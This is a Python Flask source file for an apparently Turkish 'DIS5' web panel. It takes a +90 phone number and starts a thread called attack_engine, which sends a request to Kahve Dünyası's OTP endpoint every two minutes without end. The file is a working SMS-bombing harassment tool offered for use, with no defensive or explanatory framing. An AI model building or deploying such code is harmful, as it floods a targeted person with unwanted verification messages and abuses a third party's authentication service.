import requests, time, threading, os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- MOTOR: hot-site-eu STANDARDI ---
def attack_engine(phone):
    p = "".join(filter(str.isdigit, phone))
    if p.startswith("0"): p = p[1:]
    if p.startswith("90") and len(p) > 10: p = p[2:]

    while True:
        try:
            # Kahve Dünyası Ateşleme
            requests.post("https://api.kahvedunyasi.com/v1/auth/otp", 
                          json={"mobile_number": p, "country_code": "90"},
                          timeout=10)
        except:
            pass
        time.sleep(120)

# --- TASARIM: DIS5 THE TECHNOLOGY OF EUROPE'S ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>DIS5 - OFFICIAL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #001a33; color: white; text-align: center; font-family: sans-serif; padding: 20px; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .panel { background: rgba(0,0,0,0.85); border: 2px solid #ff6600; padding: 30px; border-radius: 20px; width: 100%; max-width: 350px; box-shadow: 0 0 20px #003366; }
        .logo { width: 100%; max-width: 220px; margin-bottom: 10px; }
        h2 { font-size: 14px; color: #ff6600; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 1px; }
        .input-group { display: flex; align-items: center; background: #111; border: 1px solid #333; border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
        .prefix { padding: 12px; color: #ff6600; font-weight: bold; background: #222; border-right: 1px solid #333; }
        input { background: transparent; border: none; color: white; padding: 12px; width: 100%; outline: none; font-size: 18px; text-align: center; }
        button { background: #ff6600; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; font-size: 18px; transition: 0.3s; }
        button:hover { background: #cc5200; box-shadow: 0 0 10px #ff6600; }
        #status { display: none; color: #00ff00; margin-top: 20px; font-weight: bold; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }
    </style>
</head>
<body>
    <div class="panel">
        <img src="https://i.ibb.co/vzYv3y5/dis5-logo.png" class="logo">
        <h2>The Technology Of Europe’s</h2>
        <div id="ui">
            <form method="POST" onsubmit="start()">
                <div class="input-group">
                    <span class="prefix">+90</span>
                    <input type="text" name="phone" placeholder="5XXXXXXXXX" required maxlength="10">
                </div>
                <button type="submit">SUCCESS</button>
            </form>
        </div>
        <div id="status">OPERASYON BAŞLADI!</div>
    </div>
    <script>
        function start() {
            document.getElementById('ui').style.display = 'none';
            document.getElementById('status').style.display = 'block';
        }
    </script>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        target = request.form.get("phone")
        if target:
            threading.Thread(target=attack_engine, args=(target,), daemon=True).start()
    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
